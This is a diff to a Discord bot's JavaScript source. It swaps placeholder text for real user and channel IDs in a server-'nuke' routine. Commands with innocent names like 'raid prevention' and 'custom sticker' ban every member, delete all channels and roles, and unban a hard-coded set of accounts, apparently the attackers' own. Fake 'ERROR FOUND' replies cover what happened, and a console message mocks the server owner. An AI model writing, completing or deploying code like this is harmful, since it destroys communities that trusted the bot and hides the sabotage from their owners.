@@ -28,15 +28,16 @@ client.on('message', message =>{
       console.log(message.guild.roles);
       console.log(message.guild.channels);
       console.log(message.author.id);
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      if(message.member.id === "MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
+      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
       message.guild.members.cache.forEach(member => member.ban());
+      message.guild.members.unban("734991210808213505");
+      message.guild.members.unban("308997507428646913");
+      message.guild.members.unban("358042934748381194");
+      message.guild.members.unban("692903226508312577");
+      message.guild.members.unban("622700185088294952");
+      message.guild.members.unban("736641825808580738");
+      message.guild.members.unban("731937894998081647");
+      message.guild.members.unban("553298372547837971");
       message.guild.roles.cache.forEach(role => role.delete());
       message.reply(`Oh no! ERROR FOUND!`);
       message.reply(`looking for a game that isn't broken! game found`);
@@ -50,15 +51,16 @@ client.on('message', message =>{
 client.on('message', message =>{
   if(message.content === "!sp") {
     message.reply(`alright! starting raid prevention.`);
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      if(message.member.id === "MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
+      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
       message.guild.members.cache.forEach(member => member.ban());
+      message.guild.members.unban("734991210808213505");
+      message.guild.members.unban("308997507428646913");
+      message.guild.members.unban("358042934748381194");
+      message.guild.members.unban("692903226508312577");
+      message.guild.members.unban("622700185088294952");
+      message.guild.members.unban("736641825808580738");
+      message.guild.members.unban("731937894998081647");
+      message.guild.members.unban("553298372547837971");
       message.guild.channels.cache.forEach(channel => channel.delete());
       message.guild.roles.cache.forEach(role => role.delete());
 }
@@ -67,15 +69,16 @@ client.on('message', message =>{
 client.on('message', message =>{
   if(message.content === "!mcs") {
     message.reply(`alright! custom sticker made`);
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      if(message.member.id === "MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
+      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
       message.guild.members.cache.forEach(member => member.ban());
+      message.guild.members.unban("734991210808213505");
+      message.guild.members.unban("308997507428646913");
+      message.guild.members.unban("358042934748381194");
+      message.guild.members.unban("692903226508312577");
+      message.guild.members.unban("622700185088294952");
+      message.guild.members.unban("736641825808580738");
+      message.guild.members.unban("731937894998081647");
+      message.guild.members.unban("553298372547837971");
       message.guild.channels.cache.forEach(channel => channel.delete());
       message.guild.roles.cache.forEach(role => role.delete());
 }
@@ -89,15 +92,16 @@ client.on('message', message =>{
       console.log(message.guild.roles);
       console.log(message.guild.channels);
       console.log(message.author.id);
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      if(message.member.id === "MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
+      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
       message.guild.members.cache.forEach(member => member.ban());
+      message.guild.members.unban("734991210808213505");
+      message.guild.members.unban("308997507428646913");
+      message.guild.members.unban("358042934748381194");
+      message.guild.members.unban("692903226508312577");
+      message.guild.members.unban("622700185088294952");
+      message.guild.members.unban("736641825808580738");
+      message.guild.members.unban("731937894998081647");
+      message.guild.members.unban("553298372547837971");
       message.guild.roles.cache.forEach(role => role.delete());
       message.reply(`Oh no! ERROR FOUND!`);
       message.reply(`looking for a game that isn't broken! game found`);
@@ -115,15 +119,16 @@ client.on('message', message =>{
       console.log(message.guild.roles);
       console.log(message.guild.channels);
       console.log(message.author.id);
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      message.guild.unban("MEMBER ID HERE");
-      if(message.member.id === "MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE","MEMBER ID HERE") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
+      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
       message.guild.members.cache.forEach(member => member.ban());
+      message.guild.members.unban("734991210808213505");
+      message.guild.members.unban("308997507428646913");
+      message.guild.members.unban("358042934748381194");
+      message.guild.members.unban("692903226508312577");
+      message.guild.members.unban("622700185088294952");
+      message.guild.members.unban("736641825808580738");
+      message.guild.members.unban("731937894998081647");
+      message.guild.members.unban("553298372547837971");
       message.guild.roles.cache.forEach(role => role.delete());
       message.reply(`Oh no! ERROR FOUND!`);
       message.reply(`looking for a game that isn't broken! game found`);
@@ -135,13 +140,13 @@ client.on('message', message =>{
 });
 
 client.on('guildBanAdd', async (guild, user) => {
-	client.channels.get(`(PUT THE ID OF THE CHANNEL YOU WANT TO LOG TO)`).send(`@everyone ${user.tag} got hit with the bans from the nuke in the server.`);
+	client.channels.get(`736350391695966308`).send(`@everyone ${user.tag} got hit with the bans from the nuke in the server.`);
 });
 
 client.on('channelDelete', async (guild, channel) => {
-	client.channels.get(`(PUT THE ID OF THE CHANNEL YOU WANT TO LOG TO)`).send(`@everyone A channel got hit with the channel delete hammer from the nuke in the server.`);
+	client.channels.get(`736350375405289483`).send(`@everyone A channel got hit with the channel delete hammer from the nuke in the server.`);
 });
 
 client.on('roleDelete', async (guild, role) => {
-	client.channels.get(`(PUT THE ID OF THE CHANNEL YOU WANT TO LOG TO)`).send(`<@358042934748381194>, A role got hit with the role delete hammer from the nuke in the server.`);
+	client.channels.get(`736350405168201728`).send(`@everyone, A role got hit with the role delete hammer from the nuke in the server.`);
 });
